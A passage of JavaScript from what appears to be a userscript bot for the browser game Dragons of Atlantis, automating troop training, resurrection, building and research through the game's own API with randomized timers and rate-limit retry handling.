			} else {
				reqs.imsg = translate('Resurrection Limit');
			}
		}

		if (t.current_tab === 4) {
			if ( reqs.msg )
			{
				$J('#'+UID['Tabs.Jobs.tabResurrect.feedback_' + unit_type])
				.html( '<span style="color:#a00 !important">' + reqs.imsg + '</span>' );
				$J('#'+UID['Tabs.Jobs.tabResurrect.feedback_' + unit_type])
				.attr ( 'title', translate(unit_type) + ' \n' + reqs.msg.replace(/\+/g,' \n') );
			} 
			else {
				$J('#'+UID['Tabs.Jobs.tabResurrect.feedback_' + unit_type])
				.html(  timeFormat( reqs.time, true ) + ' (' + translate('Max') + ': ' + reqs.max_units.intToCommas() + ')' );
			}
		}
		
		return reqs;

	},

	// Check building requirements
	checkBuildReqs : function( city_idx, building_type, level ){
		var t = Tabs.Jobs;

		if ( !level) {
			level = ( Buildings.getLevel(city_idx, building_type) ).min + 1;
		}
		var cap = Data.options.building.level_cap[city_idx][building_type] || 0;
		
		if ( level <= cap ) {
			
			var reqs = t.checkRequirements ({
				reqs_type     : 'building', 
				city_idx      : city_idx, 
				building_type : building_type,
				level         : level
			});
			
			if (t.current_tab === 2){
				if ( reqs.msg ) 
				{
					$J('#'+UID['Tabs.Jobs.tabBuild.feedback_' + city_idx +'_'+ building_type])
					.html ( '<font color="#a00">'+ reqs.imsg +'</font>' );
							
					$J('#'+UID['Tabs.Jobs.tabBuild.feedback_' + city_idx +'_'+ building_type])
					.attr ( 'title', translate(building_type) + ' \n' + reqs.msg.replace(/\+/g,' \n') );
							
					$J('#'+UID['Tabs.Jobs.tabBuild.level_cap_' + city_idx +'_'+ building_type])
					.css ( 'color', '#a00' );
				}
				else {
					var fb_text = '(' + translate('Level').charAt(0) + '.' + level + ') : ' + timeFormat( reqs.time, true );

					$J('#'+UID['Tabs.Jobs.tabBuild.feedback_' + city_idx +'_'+ building_type])
					.html( fb_text );

					$J('#'+UID['Tabs.Jobs.tabBuild.feedback_' + city_idx +'_'+ building_type])
					.attr ( 'title', translate(building_type) + ' \n' + fb_text.stripTags() );
				}
			}

			return reqs;
			
		} else {
			if (t.current_tab === 2){

				$J('#'+UID['Tabs.Jobs.tabBuild.feedback_'+ city_idx +'_'+ building_type])
				.html ( '<span class="' + UID['doa-icons'] + ' i-done"></span>' );

				$J('#'+UID['Tabs.Jobs.tabBuild.feedback_' + city_idx +'_'+ building_type])
				.attr ( 'title', translate(building_type) + ' \n' + translate('Task Completed') );

				$J('#'+UID['Tabs.Jobs.tabBuild.level_cap_' + city_idx +'_'+ building_type])
				.css ( 'color', '#060' );
			}
		}
		return ({ capped:true, msg:translate('Maximum') + ' ' + translate('Current Level') });
	},
	
	
	checkResearchReqs : function ( research_type, city_idx )
	{
		var t = Tabs.Jobs;

		if ( typeof city_idx == 'undefined' ) {
			city_idx = 0;
		}

		var level =  (Seed.player.research[research_type] || 0) + 1;
		var cap = Data.options.research.level_cap[research_type] || 0;
		
		if ( level <= cap ) 
		{
			
			var reqs = t.checkRequirements ({
				reqs_type     : 'research', 
				research_type : research_type,
				level         : level,
				city_idx      : city_idx
			});

			if ( t.current_tab === 3 )
			{
				if ( reqs.msg ) 
				{
					$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+research_type])
					.html ( '<font color=#a00>' + reqs.imsg + '</font>' );
			
					$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+research_type])
					.attr ( 'title', translate(research_type) + ' \n' + reqs.msg.replace(/\+/g,' \n') );
					
					$J('#'+UID['Tabs.Jobs.tabResearch.level_cap_' + research_type])
					.css ( 'color', '#a00' );
				} 
				else {
					var fb_text = '(' + translate('Level').charAt(0) + '.' + level + ') : ' + timeFormat( reqs.time, true );
	
					$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+research_type])
					.html ( fb_text );
					
					$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+research_type])
					.attr ( 'title', translate(research_type) + ' \n' + fb_text.stripTags() );
				}
			}
			
			
			return reqs;
			
		}
		else {
			if ( t.current_tab === 3 )
			{

				$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+research_type])
				.html ( '<span class="' + UID['doa-icons'] + ' i-done"></span>' );

				$J('#'+UID['Tabs.Jobs.tabResearch.feedback_'+research_type]).
				attr ( 'title', translate(research_type) + ' \n' + translate('Task Completed') );

				$J('#'+UID['Tabs.Jobs.tabResearch.level_cap_' + research_type])
				.css ( 'color', '#060' );
			}
		}
		return ({ capped:true, msg:translate('Maximum')+' '+translate('Current Level') });

	},
	
	
	setNextTrainCity : function ( ) {
		var t = Tabs.Jobs;
		
		++t.training.current_city;
		t.training.current_troop = 0;
		
		var city_idx = t.training.current_city;
		
		while ( (!Seed.cities[ city_idx ] ||
			city_idx == OUTPOST_TYPE_INDEX['SpectralDragonOutpost'] ||
			city_idx == OUTPOST_TYPE_INDEX['SkythroneOutpost']) && 
			city_idx < Seed.cities.length )
		{
				t.training.current_city++;
				city_idx = t.training.current_city;
    } 
    
		if ( city_idx >= Seed.cities.length ) {
			t.training.current_city = 0;
		}
		
		return t.training.current_city;
	},
	
	// The training heartbeat
	// Parameters:
	//      city_idx - the city number (0 = capitol, 1 = outpost 1, 2 = outpost 2
	//
	trainTick : function ( city_idx )
	{
		var t = Tabs.Jobs;
		var delay = 30000;

		clearTimeout ( t.training.timer.tick ); t.training.timer.tick=null;
		
		if ( !Data.options.training.enabled ){
			t.training.inProgress = false; 
			return;
		}
		
		if ( t.training.inProgress == true )
		{
			delay = Math.randRange( 15000, 30000 );
			t.training.timer.tick = setTimeout ( t.trainTick, delay );
			return;
		}
		t.training.inProgress = true; 

		if ( city_idx ) {
			t.training.current_city = city_idx;
		} else {
			city_idx = t.training.current_city;
		}
		
		var by_queue = Data.options.training.mode === 'resources';
		var queue_length = ( Seed.cities[ city_idx ].figures.queue_lengths[ 'units' ] || 0 );
		var total_jobs = Seed.total.training[ Seed.cities[ city_idx ].id ];
		
		var jobs =  getJobs( 'units' , city_idx );
		
		if ( t.training.current_troop !== 0 || jobs.length === 0 || ( by_queue && total_jobs < queue_length ) )
		{
			var job_list = Data.options.training.city[ city_idx ].units;
			
			var units_type = getKeys ( job_list ).sort();
			var len = units_type.length;
			//logit('trainTick city_idx='+city_idx+';t.training.current_troop = '+t.training.current_troop+'/'+len + ';jobs.length=' + jobs.length );
			while ( t.training.current_troop < len ) 
			{
				var unit_type = units_type[  t.training.current_troop ];
				t.training.current_troop++;
				if (!Units.isTrainable( unit_type, city_idx )) continue;
				
				var unit_quantity = job_list[ unit_type ];
				
				if ( unit_quantity < 1) {
					continue;
				}
				
				var reqs = t.checkTrainReqs( unit_type, unit_quantity, city_idx );

				if ( !reqs.msg ) {
				
					if ( Seed.total.training[ Seed.cities[ city_idx ].id ] >= queue_length ) {
						break;
					}
				
			//logit('trainTick city_idx='+city_idx+';training '+ unit_quantity + ' '+ unit_type);
					t.doTrain( unit_type, unit_quantity, city_idx, false );
					
					//Seed.total.training[ Seed.cities[ city_idx ].id ]++;
					
					//if ( by_queue )
					//{
					//	// move to the end
					//	delete ( job_list[ unit_type ] );
					//	job_list[ unit_type ] = unit_quantity;
					//}
					delay = Math.randRange( 7500, 15000 );
					t.training.timer.tick = setTimeout ( t.trainTick, delay);
					if ( t.current_tab === 1 ) {
						t.dispFeedback ( translate( Seed.cities[ city_idx ].name ) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 )  );
					}
					//t.training.inProgress = false;
					return;
				}
			}
		}
		
		city_idx = t.setNextTrainCity();
		
		//if ( city_idx ){
		//	delay = Math.randRange( 2000, 4000 );
		//	if ( t.current_tab === 1 ) {
		//		t.dispFeedback ( translate( Seed.cities[ city_idx ].type || Seed.cities[ city_idx ].outpost_type) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 )  );
		//	}
		//} else if ( !Data.options.attacks.enabled ) {
			delay = Math.randRange( 15000, 30000 );
			if ( t.current_tab === 1 ) {
				t.dispFeedback ( translate( Seed.cities[ city_idx ].name ) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 )  );
			}
		//} else {
		//	delay = Math.randRange( 40000, 60000 );
		//	if ( t.current_tab === 1 ) {
		//		t.dispFeedback ( translate( Seed.cities[ city_idx ].type || Seed.cities[ city_idx ].outpost_type) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 ) + ' ... ' + translate('March returning') );
		//	}
		//}
				
		verboseLog('trainTick City' + ( city_idx ) );
		t.training.inProgress = false;
		t.training.timer.tick = setTimeout ( t.trainTick, delay );
	},

	// The resurrection heartbeat
	// Parameters:
	//      city_idx - the city number (0 = capitol, 1 = outpost 1, 2 = outpost 2
	//
	resurrectTick : function ( city_idx )
	{
		var t = Tabs.Jobs;
		var delay = 30000;

		clearTimeout ( t.resurrection.timer.tick ); t.resurrection.timer.tick=null;
		
		if ( !Data.options.resurrection.enabled ){
			t.resurrection.inProgress = false; 
			return;
		}
		
		if ( t.resurrection.inProgress == true )
		{
			delay = Math.randRange( 15000, 30000 );
			t.resurrection.timer.tick = setTimeout ( t.resurrectTick, delay );
			return;
		}
		t.resurrection.inProgress = true; 

		if ( city_idx ) {
			t.resurrection.current_city = city_idx;
		} else {
			city_idx = t.resurrection.current_city = OUTPOST_TYPE_INDEX['SpectralDragonOutpost'];
		}
		
		//var by_queue = Data.options.training.mode === 'resources';

		var queue_length = ( Seed.cities[ city_idx ].figures.queue_lengths[ 'resurrection' ] || 0 );
		var total_jobs = Seed.total.training[ Seed.cities[ city_idx ].id ];
		
		var jobs =  getJobs( 'resurrection' , city_idx );
		
		if ( t.resurrection.current_troop !== 0 || jobs.length === 0  ) //|| ( by_queue && total_jobs < queue_length )
		{
			var job_list = Data.options.resurrection.city[ 0 ].units;
			
			var units_type = getKeys ( job_list );
			var len = units_type.length;
			while ( t.resurrection.current_troop < len ) 
			{
				var unit_type = units_type[  t.resurrection.current_troop ];
				t.resurrection.current_troop++;
				
				var unit_quantity = job_list[ unit_type ];
				
				if ( unit_quantity > (Seed.cities[0].souls [ unit_type ]||0) ) {
					unit_quantity=Seed.cities[0].souls [ unit_type ]||0 ;
					Data.options.resurrection.city[ 0 ].units[ unit_type ] = unit_quantity;
				}

				if ( unit_quantity < 1) {
					continue;
				}
				
				var reqs = t.checkResurrectReqs( unit_type, unit_quantity, city_idx );

				if ( !reqs.msg ) {
				
					if ( Seed.total.training[ Seed.cities[ city_idx ].id ] >= queue_length ) {
						break;
					}
				
					t.doResurrect( unit_type, unit_quantity, city_idx, false );
					
					//Seed.total.training[ Seed.cities[ city_idx ].id ]++;
					
					//if ( by_queue )
					//{
					//	// move to the end
					//	delete ( job_list[ unit_type ] );
					//	job_list[ unit_type ] = unit_quantity;
					//}
					delay = Math.randRange( 7500, 15000 );
					t.resurrection.timer.tick = setTimeout ( t.resurrectTick, delay);
					if ( t.current_tab === 4 ) {
						t.dispFeedback ( translate( Seed.cities[ city_idx ].name ) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 )  );
					}
					//t.resurrection.inProgress = false;
					return;
				}
			}
			if (t.resurrection.current_troop = len) {
				t.resurrection.current_troop = 0;
			}
		}
		
		//city_idx = t.setNextTrainCity();
		
		//if ( city_idx ){
		//	delay = Math.randRange( 2000, 4000 );
		//	if ( t.current_tab === 1 ) {
		//		t.dispFeedback ( translate( Seed.cities[ city_idx ].type || Seed.cities[ city_idx ].outpost_type) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 )  );
		//	}
		//} else if ( !Data.options.attacks.enabled ) {
			delay = Math.randRange( 15000, 30000 );
			if ( t.current_tab === 4 ) {
				t.dispFeedback ( translate( Seed.cities[ city_idx ].name ) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 ) );
			}
		//} else {
		//	delay = Math.randRange( 40000, 60000 );
		//	if ( t.current_tab === 1 ) {
		//		t.dispFeedback ( translate( Seed.cities[ city_idx ].type || Seed.cities[ city_idx ].outpost_type) + ' ' + translate('Starting Soon') + '... ' + timeFormat( delay/1000 ) + ' ... ' + translate('March returning') );
		//	}
		//}
				
		verboseLog('resurrectTick City' + ( city_idx ) );
		t.resurrection.inProgress = false;
		t.resurrection.timer.tick = setTimeout ( t.resurrectTick, delay );	
	},

	// Queue the training job
	// Parameters:
	//      unit_type - Porter, Conscript, etc.
	//      unit_quantity - number of units to train
	//      city_idx - city index (0=capitol, 1=outpost 1, 2 = outpost 2)
	doTrain : function ( unit_type, unit_quantity, city_idx, forcing )
	{
		var t = Tabs.Jobs;
		var city = Seed.cities[city_idx];
		var msg = ' (' + translate(Seed.cities[city_idx].name) + ') ' + translate('Training') + ' ' + unit_quantity + ' ' + translate(unit_type);
		//t.dispFeedback (msg);

		MyAjax.units ({
			city_id       : city.id,
			unit_type     : unit_type,
			unit_quantity : unit_quantity,
			
			onSuccess     : function ( r ) {

				t.training.errors = 0;
				
				actionLog (msg);
				
				if ( t.current_tab === 1 ) {
					t.dispFeedback ( msg );
				}

				// Didi : only when outpost
				if (city_idx !=0 ) {
					// Remove resources used
					// cloned in order to not modify the original
					try {
						if (Seed.requirements.unit[ r.job.unit_type ].resources) {
							var resources = Seed.requirements.unit[ r.job.unit_type ].resources.cloneProps();
							// values calculated based on the number of troops
							for ( var type in resources ) {
								if ( resources.hasOwnProperty( type ) ) {
									resources[type] *= r.job.quantity;
								}
							}
							Resources.remove( resources );
						}
						
						// Didi : update population
						if (Seed.requirements.unit[ r.job.unit_type ].population) {
							var population = Seed.requirements.unit[ r.job.unit_type ].population.cloneProps();
							Seed.cities[0].figures.population.armed_forces += population.idle * r.job.quantity;
						}
						
						// Didi : update units
						if (Seed.requirements.unit[ r.job.unit_type ].units) {
							var units = Seed.requirements.unit[ r.job.unit_type ].units.cloneProps();
							// values calculated based on the number of troops
							for ( var type in units ) {
								if ( units.hasOwnProperty( type ) ) {
									units[type] *= r.job.quantity;
									if (Seed.cities[0].units[type]) {
										Units.remove(type,units[type]);
									}
								}
							}
						}
					} catch (e) {
						debugLog('ERROR update resources, population and units in doTrain '+r.job.unit_type+' : ' + e);
					}
				}
				
				// Didi : remove items
				try {
					if (Seed.requirements.unit[ r.job.unit_type ].items) {
						var items = Seed.requirements.unit[ r.job.unit_type ].items.cloneProps();
						// values calculated based on the number of troops
						for ( var type in items ) {
							if ( items.hasOwnProperty( type ) ) {
								items[type] *= r.job.quantity;
							}
						}
						Items.remove( items );
					}
				} catch (e) {
					debugLog('ERROR update items in doTrain '+r.job.unit_type+' : ' + e);
				}
				
				
				// By Lord Mimir
				/** Get the units being built so the will be displayed
				*  The units.json has the city the training happen at as part of the response
				*  so no need to call it just use the info sent
				*/
				Seed.updateCity ( r.city );  
				
				t.training.inProgress = false;
			},
			
			onFailure     : function ( r ) {

				if ( r.status ) {
					if ( r.status === 509 )	{
						var delay = ERROR_509_DELAY;
						if ( t.current_tab === 1 ) {
							t.dispFeedback ( '<b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
						clearTimeout ( t.training.timer.tick ); t.training.timer.tick=null;
						t.training.timer.tick = setTimeout( t.trainTick, delay );
					} 
					if ( r.status === 429 )	{
						var delay = ERROR_429_DELAY;
						if ( t.current_tab === 1 ) {
							t.dispFeedback ( '<b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
						clearTimeout ( t.training.timer.tick ); t.training.timer.tick=null;
						t.training.timer.tick = setTimeout( t.trainTick, delay );
					} 
				}
				else {
					verboseLog ('Error: Training: ' + unit_type + ' ' + r.errmsg);
					
					actionLog (translate('Error') + ' ' + translate('Training') + ': ' + translate(unit_type) + ' ' + r.errmsg);

					if (!forcing) {
						t.training.errors++;
					}

					// The queue is frequently full, but we could be getting server errors (500) too
					// Wait a couple of minutes
					if ( t.training.errors > 10 )
					{
						if ( t.current_tab === 1 ) {
							t.dispFeedback (translate('Too many errors, disabling auto training'));
						}
						t.setTrainEnable ( false );
						t.training.errors = 0;
					}
					else {
						if ( t.current_tab === 1 ) {
							t.dispFeedback (translate('Error') + ' ' + translate('Training') + ': ' + translate(unit_type) + ' ' +  r.errmsg);
						}
						
						// Increases the waiting time for next retry errors
						t.training.error_delay *= 1.5;
						
						clearTimeout ( t.training.timer.tick ); t.training.timer.tick=null;
						t.training.timer.tick = setTimeout( t.trainTick, t.training.error_delay );
					}
				}
				t.training.inProgress = false;
			},
			
			delay        : Math.randRange(3000, 6000),
			caller       : 'doTrain'
		});
	},


	// Queue the resurrect job
	// Parameters:
	//      unit_type - Porter, Conscript, etc.
	//      unit_quantity - number of units to train
	//      city_idx - city index (0=capitol, 1=outpost 1, 2 = outpost 2)
	doResurrect : function ( unit_type, unit_quantity, city_idx, forcing )
	{
		var t = Tabs.Jobs;
		var city = Seed.cities[city_idx];
		var msg = ' (' + translate(city.name) + ') ' + translate('Resurrection') + ' ' + unit_quantity + ' ' + translate(unit_type);
		//t.dispFeedback (msg);

		MyAjax.resurrect ({
			city_id       : city.id,
			unit_type     : unit_type,
			unit_quantity : unit_quantity,
			
			onSuccess     : function ( r ) {

				t.resurrection.errors = 0;
				
				actionLog (msg);
				
				if ( t.current_tab === 4 ) {
					t.dispFeedback ( msg );
				}

				// Didi : only when outpost
				if (city_idx !=0 ) {
					// Remove resources used
					// cloned in order to not modify the original
					try {
						var resources = Seed.requirements.resurrect[ r.job.unit_type ].resources.cloneProps();
						// values ​​calculated based on the number of troops
						for ( var type in resources ) {
							if ( resources.hasOwnProperty( type ) ) {
								resources[type] *= r.job.quantity;
							}
						}
						Resources.remove( resources );
						// update souls
						Seed.cities[0].souls [ r.job.unit_type ] -= r.job.quantity;
						$J('#'+UID['Tabs.Jobs.tabResurrect.TotalR_' + r.job.unit_type]).html(Seed.cities[0].souls [ r.job.unit_type ]);
					} catch (e) {
						debugLog('ERROR in doResurrect: ' + e);
					}
				}
				
				// By Lord Mimir
				/** Get the units being built so the will be displayed
				*  The units.json has the city the training happen at as part of the response
				*  so no need to call it just use the info sent
				*/
				Seed.updateCity ( r.city );  
				
				t.resurrection.inProgress = false;
			},
			
			onFailure     : function ( r ) {

				if ( r.status ) {
					if ( r.status === 509 )	{
						var delay = ERROR_509_DELAY;
						if ( t.current_tab === 1 ) {
							t.dispFeedback ( '<b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
						clearTimeout ( t.resurrection.timer.tick ); t.resurrection.timer.tick=null;
						t.resurrection.timer.tick = setTimeout( t.resurrectTick, delay );
					} 
					if ( r.status === 429 )	{
						var delay = ERROR_429_DELAY;
						if ( t.current_tab === 1 ) {
							t.dispFeedback ( '<b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
						clearTimeout ( t.resurrection.timer.tick ); t.resurrection.timer.tick=null;
						t.resurrection.timer.tick = setTimeout( t.resurrectTick, delay );
					} 
				}
				else {
					verboseLog ('Error: Resurrection: ' + unit_type + ' ' + r.errmsg);
					
					actionLog (translate('Error') + ' ' + translate('Resurrection') + ': ' + translate(unit_type) + ' ' + r.errmsg);

					if (!forcing) {
						t.resurrection.errors++;
					}

					// The queue is frequently full, but we could be getting server errors (500) too
					// Wait a couple of minutes
					if ( t.resurrection.errors > 10 )
					{
						if ( t.current_tab === 4 ) {
							t.dispFeedback (translate('Too many errors, disabling auto resurrection'));
						}
						t.setResurrectEnable ( false );
						t.resurrection.errors = 0;
					}
					else {
						if ( t.current_tab === 4 ) {
							t.dispFeedback (translate('Error') + ' ' + translate('Resurrection') + ': ' + translate(unit_type) + ' ' +  r.errmsg);
						}
						
						// Increases the waiting time for next retry errors
						t.resurrection.error_delay *= 1.5;
						
						clearTimeout ( t.resurrection.timer.tick ); t.resurrection.timer.tick=null;
						t.resurrection.timer.tick = setTimeout( t.resurrectTick, t.resurrection.error_delay );
					}
				}
				t.resurrection.inProgress = false;
			},
			
			delay        : Math.randRange(3000, 6000),
			caller       : 'doResurrect'
		});
	},

	// Queue the release job
	// Parameters:
	//      unit_type - Porter, Conscript, etc.
	//      unit_quantity - number of units to train
	//      city_idx - city index (0=capitol, 1=outpost 1, 2 = outpost 2)
	doRelease : function ( unit_type, unit_quantity )
	{
		var t = Tabs.Jobs;
		var city = Seed.cities[0];
		var msg = ' (' + translate(city.name) + ') ' + translate('Release') + ' ' + unit_quantity + ' ' + translate(unit_type);
		//t.dispFeedback (msg);

		MyAjax.release ({
			city_id       : city.id,
			unit_type     : unit_type,
			unit_quantity : unit_quantity,
			
			onSuccess     : function ( r ) {

				//t.release.errors = 0;
				
				actionLog (msg);
				
				if ( t.current_tab === 4 ) {
					t.dispFeedback ( msg );
				}
				
				// By Lord Mimir
				/** Get the units being built so the will be displayed
				*  The units.json has the city the training happen at as part of the response
				*  so no need to call it just use the info sent
				*/
				Seed.updateCity ( r.city );  
				$J('#'+UID['Tabs.Jobs.tabResurrect.TotalR_' + unit_type]).html(Seed.cities[0].souls [ unit_type ]);

			},
			
			onFailure     : function ( r ) {
				
				if ( r.status ) {
					if ( r.status === 509 )	{
						var delay = ERROR_509_DELAY;
						if ( t.current_tab === 1 ) {
							t.dispFeedback ( '<b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
					} 
					if ( r.status === 429 )	{
						var delay = ERROR_429_DELAY;
						if ( t.current_tab === 1 ) {
							t.dispFeedback ( '<b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
					} 
				}
				else {
					verboseLog ('Error: Release: ' + unit_type + ' ' + r.errmsg);
					
					actionLog (translate('Error') + ' ' + translate('Release') + ': ' + translate(unit_type) + ' ' + r.errmsg);

					if ( t.current_tab === 4 ) {
						t.dispFeedback (translate('Error') + ' ' + translate('Release') + ': ' + translate(unit_type) + ' ' +  r.errmsg);
					}
						
				}
			},
			
			delay        : Math.randRange(3000, 6000),
			caller       : 'doRelease'
		});
	},

	setNextBuildCity : function ( ) {
		var t = Tabs.Jobs;
		
		++t.building.current_city;
		
		var city_idx = t.building.current_city;
		
		while ( !Seed.cities[ city_idx ] && 
			 city_idx < Seed.cities.length )
		{
				t.building.current_city++;
				city_idx = t.building.current_city;
    } 
    
		if ( city_idx >= Seed.cities.length ) {
			t.building.current_city = 0;
		}
		
		return t.building.current_city;
	},

	// New approach 07072011b
	// Calculate the completion time by examining the job record for any job running
	// While auto-build is enabled, this function is called on a 4 second timer
	// It resets the timer to 20 seconds if doBuild() has an error and fetches the Seed
	// to get updated information
	// It will turn off auto-build if the error count exceeds three
	buildTick : function ( city_idx )
	{
		var t = Tabs.Jobs;
		var delay;
		
		clearTimeout ( t.building.timer.tick ); t.building.timer.tick=null;
		
		if ( !Data.options.building.enabled ) {
			t.building.inProgress = false; 
			return;
		}
		
		if ( t.building.inProgress == true )
		{
			delay = Math.randRange( 7500, 15000 );
			t.building.timer.tick = setTimeout ( t.buildTick, delay );
			return;
		}
		t.building.inProgress = true; 

		if ( city_idx ) {
			t.building.current_city = city_idx;
		} else {
			city_idx = t.building.current_city;
		}
		
		// Fix city_idx in case of wrong number, undefined or overflow
    if ( isNaN( city_idx ) || city_idx < 0 || city_idx >= Seed.cities.length ){
    	city_idx = 0;
    }  
        
    // in case the city is not been defined in Seed.updateCity skip to next in array.
		if ( !Seed.cities[city_idx] )
		{
			city_idx = t.setNextBuildCity();
		}
		
		// Didi : security job finish and refresh in use
		if ( t.building.refreshBuilding ) {
			delay = Math.randRange( 5000, 10000)
		
			if ( t.current_tab === 2 ) {
				t.dispFeedback ( translate( Seed.cities[ city_idx ].name ) + ' ' + translate('waiting') + ', ' + translate('Starting Soon') + '...' + timeFormat(delay/1000) );
			}
		
			t.building.timer.tick = setTimeout ( t.buildTick, delay, city_idx );
			return;
		}

		var jobs = getJobs ( 'building', city_idx );
		
		// city not currently building
		if ( jobs.length === 0 )
		{
			// Make the job list
			var job_list = []; // Concatenated array of buildings
			var build_list = [];
			for ( var name in Data.options.building.level_enable[city_idx] )
			{
				// Is this building type enabled for autobuild?
				if ( Data.options.building.level_enable[city_idx][name] )
				{
					// get the current list of buildings to upgrade taking into account the cap limit ( this is do it with the last boolean argument)
					build_list = Buildings.getList ( city_idx, name, true );
					build_list.sort ( function(a,b){return a.level-b.level} );
					job_list = job_list.concat ( build_list );
				}
			}
			
			job_list.sort ( function(a,b){return a.level-b.level} );
			
			for ( var i=0; i < job_list.length; i++ )
			{
				var job = job_list[i];
				
				//didi : only building have min level
				var build_level = Buildings.getLevel( city_idx, job.type )
				if (job.level > build_level.min) continue;

				// Check the requirements
				
				var reqs = t.checkBuildReqs( city_idx, job.type, (job.level+1) );
				
				// If the requirements are met, we began job
				if ( !reqs.msg )
				{
					t.doBuild(job_list[i].id, city_idx, false);
					
					// next City
					break;
				}
				// The requirements were not met
				else {
					// If the user is on building tab shows the requirements
					if ( t.current_tab === 2 ){
						t.dispFeedback ( translate(job_list[i].type) +': '+ reqs.msg );
					}
				}
			}
		}
		
		var next_city_idx = t.setNextBuildCity();
		
		delay = Math.randRange( 15000, 30000);

		if ( t.current_tab === 2 ) {
			t.dispFeedback ( translate( Seed.cities[ next_city_idx ].name ) + ' ' + translate('Starting Soon') + '...' + timeFormat(delay/1000) );
		}
		
		t.building.inProgress = false; 
		t.building.timer.tick = setTimeout ( t.buildTick, delay, next_city_idx );
	},

	doBuild : function ( building_id , city_idx, forcing )
	{
		var t = Tabs.Jobs;
		var building=Buildings.getById(city_idx,building_id);
		// Initiates the request to the server
		MyAjax.buildings ({
			city_id     : Seed.cities[city_idx].id,
			
			building_id : building_id,
			
			onSuccess   : function ( r ){
				t.building.errors = 0;
				
				// Remove resources used
				Resources.remove( Seed.requirements.building[ r.job.city_building_type ].level[ r.job.level ].resources );
				
				var msg = translate('Building')+ ': ' + translate(r.job.city_building_type) + ' (' + r.job.level +') '+ translate('at') + ' ' + translate(Seed.cities[city_idx].name);
				
				actionLog (msg);
		
				if ( t.current_tab === 2 ) {
					t.dispFeedback ( msg );
				}
				t.building.inProgress = false; 
			},
			
			onFailure   : function ( r ){
			
				clearTimeout ( t.building.timer.tick ); t.building.timer.tick=null;
				
				if ( r.status ) {
					if ( r.status === 509 )	{
						var delay = ERROR_509_DELAY;
						if ( t.current_tab === 2 ) {
							t.dispFeedback ( '<b>' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
						// Wait and try again
						t.building.timer.tick = setTimeout( t.buildTick, delay );
					}
					if ( r.status === 429 )	{
						var delay = ERROR_429_DELAY;
						if ( t.current_tab === 2 ) {
							t.dispFeedback ( '<b>API ' + translate('Bandwidth Limit Exceeded') + '</b>,' + translate('Too many requests') + '! -  ' + translate('Retry in') + ' :' + timeFormat( delay/1000 ) );
						}
						// Wait and try again
						t.building.timer.tick = setTimeout( t.buildTick, delay );
					}
				}
				else {
				
					if (!forcing) {
						t.building.errors++;
					}

					actionLog (building.type + ': ' + r.errmsg);
					
					if ( t.building.errors > 5 )
					{
						if ( t.current_tab === 2 ) {
							t.dispFeedback (translate('Too many errors, disabling auto-build'));
						}
						t.setBuildEnable ( false );
						t.building.errors = 0;
						return;
					}

					// Increases the waiting time for next retry errors
					t.building.error_delay *= 1.5;
					
					t.building.timer.tick = setTimeout ( t.buildTick, t.building.error_delay );
					
					if ( t.current_tab === 2 ) {
						t.dispFeedback (translate(building.type) + ': ' + r.errmsg + ' ' + translate('Retry in') + ': '+ timeFormat(t.building.error_delay/1000) );
					}
					
				}
				
				t.building.inProgress = false; 
			},
			
			caller      : 'doBuild'
		});
	},
	
	setNextResearchCity : function ( ) {
		var t = Tabs.Jobs;
		
		if ( Data.options.cheat.outpost_research ) 
		{
			++t.research.current_city;
			
			var city_idx = t.research.current_city;
			var city = Seed.cities[ city_idx ];
			while ( (!city ||  
				!city.figures ||
				!city.figures.queue_lengths ||
				!city.figures.queue_lengths['research']) &&
				 city_idx < Seed.cities.length )
			{
				t.research.current_city++;
				city_idx = t.research.current_city;
				var city = Seed.cities[ city_idx ];
    	}
  	} else {
  		t.research.current_city = 0;
  	}
    
		if ( city_idx >= Seed.cities.length ) {
			t.research.current_city = 0;
		}
		
		return t.research.current_city;
	},

	// Research heartbeat
	researchTick : function ( city_idx )
	{
		var t = Tabs.Jobs;
		var reqs,delay;
		
		clearTimeout ( t.research.timer.tick ); t.research.timer.tick=null;
		
		if ( !Data.options.research.enabled ){
			t.research.inProgress = false; 
			return;
		}

		if ( city_idx ) {
			t.research.current_city = city_idx;
		} else {
			city_idx = t.research.current_city;
		}
		
		// Fix city_idx in case of wrong number, undefined or overflow
    if ( isNaN( city_idx ) || city_idx < 0 || city_idx >= Seed.cities.length ){
    	city_idx = 0;
    }  
        
    // in case the city is not been defined in Seed.updateCity skip to next in array.
		if ( !Seed.cities[city_idx] )
		{
			t.researchTick ( city_idx + 1 );
			return;
		}
		

		if ( t.research.inProgress == true )
		{
			delay = Math.randRange( 15000, 30000 );
			t.research.timer.tick = setTimeout ( t.researchTick, delay );
			return;
		}
		t.research.inProgress = true; 

		//var current_research = {};
		//for (var i = 0; i < Seed.cities.length; i++) {
		//	if ( !Seed.cities[i] ) continue;
		//	var jobs = getJobs ( 'research', i );
		//	for (var j = 0; j < jobs.length; j++) {
		//		var job = jobs[j];
